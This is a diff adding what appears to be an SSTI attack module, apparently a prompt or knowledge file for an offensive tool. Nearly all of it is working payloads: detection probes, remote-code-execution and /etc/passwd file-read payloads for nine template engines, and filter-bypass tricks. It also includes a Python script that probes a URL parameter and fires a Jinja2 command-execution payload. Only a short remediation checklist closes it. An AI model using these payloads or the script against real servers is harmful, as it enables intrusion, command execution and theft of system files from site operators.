@@ -1,0 +1,345 @@
+{# Server-Side Template Injection (SSTI) Module #}
+{# Comprehensive SSTI detection and exploitation #}
+
+<ssti_module>
+
+## SERVER-SIDE TEMPLATE INJECTION (SSTI) GUIDE
+
+### DETECTION METHODOLOGY
+
+**Universal Detection Payloads:**
+```
+{{7*7}}           -> 49 = Jinja2, Twig, etc.
+${7*7}            -> 49 = Freemarker, Velocity
+<%= 7*7 %>        -> 49 = ERB (Ruby)
+#{7*7}            -> 49 = Thymeleaf
+${{7*7}}          -> 49 = Spring Expression
+[= 7*7 ]          -> 49 = Pebble
+@(7*7)            -> 49 = Razor
+{{= 7*7 }}        -> 49 = doT
+*{7*7}            -> 49 = Thymeleaf
+```
+
+**Polyglot Detection Payload:**
+```
+${{<%[%'"}}%\.
+```
+
+**Framework-Specific Detection:**
+```
+# Jinja2 (Python)
+{{config}}
+{{self.__class__.__mro__}}
+
+# Twig (PHP)
+{{_self.env.display}}
+{{_self.env}}
+
+# Freemarker (Java)
+${object.class}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+
+# Velocity (Java)
+#set($x=1+1)$x
+$class.inspect("java.lang.Runtime")
+
+# Smarty (PHP)
+{php}phpinfo();{/php}
+{if phpinfo()}{/if}
+
+# ERB (Ruby)
+<%= 7*7 %>
+<%= system('id') %>
+
+# Thymeleaf (Java)
+${T(java.lang.System)}
+```
+
+### JINJA2 EXPLOITATION (Python)
+
+**Basic RCE:**
+```python
+# Method 1: Through config
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+
+# Method 2: Through MRO
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+
+# Method 3: Subclass enumeration for RCE
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
+{% endif %}
+{% endfor %}
+
+# Method 4: lipsum trick
+{{ lipsum.__globals__["os"].popen("id").read() }}
+
+# Method 5: cycler trick
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+```
+
+**Bypassing Filters:**
+```python
+# Bypass quotes
+{{ lipsum.__globals__["os"].popen(request.args.cmd).read() }}
+# URL: ?cmd=id
+
+# Bypass underscores using |attr filter
+{{ ()|attr('\x5f\x5fclass\x5f\x5f') }}
+
+# Bypass using request object
+{{ request['__class__'] }}
+
+# Hex encoding
+{{ ''['\x5f\x5fclass\x5f\x5f'] }}
+
+# Unicode encoding
+{{ ''['\u005f\u005fclass\u005f\u005f'] }}
+
+# Using string concatenation
+{% set a='__cla' %}{% set b='ss__' %}{{ ''[a~b] }}
+```
+
+### TWIG EXPLOITATION (PHP)
+
+**Basic RCE:**
+```php
+# Environment access
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+
+# Alternative method
+{{_self.env.registerUndefinedFilterCallback("system")}}
+{{_self.env.getFilter("whoami")}}
+
+# File read
+{{ source('/etc/passwd') }}
+
+# Using filters
+{{"id"|system}}
+
+# Using functions
+{{passthru("id")}}
+```
+
+**Twig 3.x Bypass:**
+```php
+# Using namespace
+{{'ls'|filter('system')}}
+
+# Using arrow functions
+{{['id']|reduce((a,b)=>a~passthru(b))}}
+
+# Using map
+{{['id']|map('system')|join}}
+
+# File inclusion
+{{ include('/etc/passwd') }}
+```
+
+### FREEMARKER EXPLOITATION (Java)
+
+**Basic RCE:**
+```java
+# Execute class
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ ex("id") }
+
+# ObjectConstructor
+<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
+<#assign rt=ob("java.lang.Runtime").getRuntime()>
+${ rt.exec("id") }
+
+# TemplateModel
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?string}
+
+# Simple execution
+${"freemarker.template.utility.Execute"?new()("id")}
+```
+
+### VELOCITY EXPLOITATION (Java)
+
+**Basic RCE:**
+```java
+# Using ClassTool
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
+
+# Using Runtime directly
+#set($rt = $class.inspect("java.lang.Runtime").type.getRuntime())
+#set($process = $rt.exec("id"))
+#set($out = $process.getInputStream())
+
+# File read
+#set($file = $class.inspect("java.io.File").type)
+#set($fis = $class.inspect("java.io.FileInputStream").type.getConstructor($file).newInstance($file.new("/etc/passwd")))
+```
+
+### SMARTY EXPLOITATION (PHP)
+
+**Basic RCE:**
+```php
+# Direct PHP execution (if not sandboxed)
+{php}system('id');{/php}
+
+# Using if
+{if phpinfo()}{/if}
+{if system('id')}{/if}
+
+# Using Smarty objects
+{self::getStreamVariable("file:///etc/passwd")}
+
+# Using math
+{math equation="(x+1)" x="1|id -u" }
+
+# Smarty 3.1.x
+{function name='rce(){};system("id");function f(){}'}
+```
+
+### THYMELEAF EXPLOITATION (Java)
+
+**Basic RCE:**
+```java
+# Using T() operator
+${T(java.lang.Runtime).getRuntime().exec('id')}
+
+# Spring EL
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+
+# Using ProcessBuilder
+${new java.util.Scanner(new java.lang.ProcessBuilder("bash","-c","id").start().getInputStream()).useDelimiter("\\A").next()}
+
+# Thymeleaf fragment
+~{::__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__}
+```
+
+### ERB EXPLOITATION (Ruby)
+
+**Basic RCE:**
+```ruby
+# Command execution
+<%= `id` %>
+<%= system('id') %>
+<%= exec('id') %>
+
+# Using backticks
+<%= `cat /etc/passwd` %>
+
+# Kernel.exec
+<%= Kernel.exec('id') %>
+
+# File read
+<%= File.read('/etc/passwd') %>
+
+# IO.popen
+<%= IO.popen('id').read %>
+```
+
+### PEBBLE EXPLOITATION (Java)
+
+**Basic RCE:**
+```java
+# Using beans
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE
+     .forName('java.lang.Runtime')
+     .methods[6]
+     .invoke(null,null)
+     .exec(cmd)
+     .inputStream
+     .readAllBytes() %}
+{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}
+```
+
+### MAKO EXPLOITATION (Python)
+
+**Basic RCE:**
+```python
+# Import and execute
+${__import__("os").popen("id").read()}
+
+# Using module
+<%
+import os
+os.system('id')
+%>
+
+# File read
+<%
+f = open('/etc/passwd')
+print(f.read())
+%>
+```
+
+### PAYLOAD DATABASE
+
+**Detection Matrix:**
+| Engine | Detection | Language |
+|--------|-----------|----------|
+| Jinja2 | `{{7*'7'}}` -> 7777777 | Python |
+| Twig | `{{7*'7'}}` -> 49 | PHP |
+| Freemarker | `${7*7}` -> 49 | Java |
+| Velocity | `$class` -> object ref | Java |
+| Smarty | `{7*7}` -> 49 | PHP |
+| ERB | `<%=7*7%>` -> 49 | Ruby |
+| Thymeleaf | `[[${7*7}]]` -> 49 | Java |
+| Pebble | `{{7*7}}` -> 49 | Java |
+
+### AUTOMATION SCRIPT
+
+```python
+#!/usr/bin/env python3
+"""
+SSTI Detection and Exploitation Script
+"""
+
+import requests
+import re
+
+DETECTION_PAYLOADS = [
+    ("{{7*7}}", "49", "Jinja2/Twig/Tornado"),
+    ("${7*7}", "49", "Freemarker/Velocity"),
+    ("<%= 7*7 %>", "49", "ERB"),
+    ("#{7*7}", "49", "Thymeleaf/Ruby"),
+    ("{7*7}", "49", "Smarty"),
+    ("{{7*'7'}}", "7777777", "Jinja2"),
+    ("{{7*'7'}}", "49", "Twig"),
+]
+
+def detect_ssti(url, param):
+    """Detect SSTI vulnerability."""
+    for payload, expected, engine in DETECTION_PAYLOADS:
+        r = requests.get(url, params={param: payload})
+        if expected in r.text:
+            print(f"[+] SSTI Detected! Engine: {engine}")
+            print(f"    Payload: {payload}")
+            return engine
+    return None
+
+def exploit_jinja2(url, param, cmd):
+    """Exploit Jinja2 SSTI."""
+    payload = f"{{{{ lipsum.__globals__['os'].popen('{cmd}').read() }}}}"
+    r = requests.get(url, params={param: payload})
+    return r.text
+
+if __name__ == "__main__":
+    import sys
+    url = sys.argv[1]
+    param = sys.argv[2]
+    engine = detect_ssti(url, param)
+    if engine:
+        print(f"[*] Attempting exploitation for {engine}...")
+```
+
+### REMEDIATION
+
+- [ ] Avoid user input in templates when possible
+- [ ] Use sandboxed template environments
+- [ ] Implement strict input validation
+- [ ] Use logic-less templates (Mustache)
+- [ ] Disable dangerous functions/classes
+- [ ] Keep template engines updated
+
+</ssti_module>
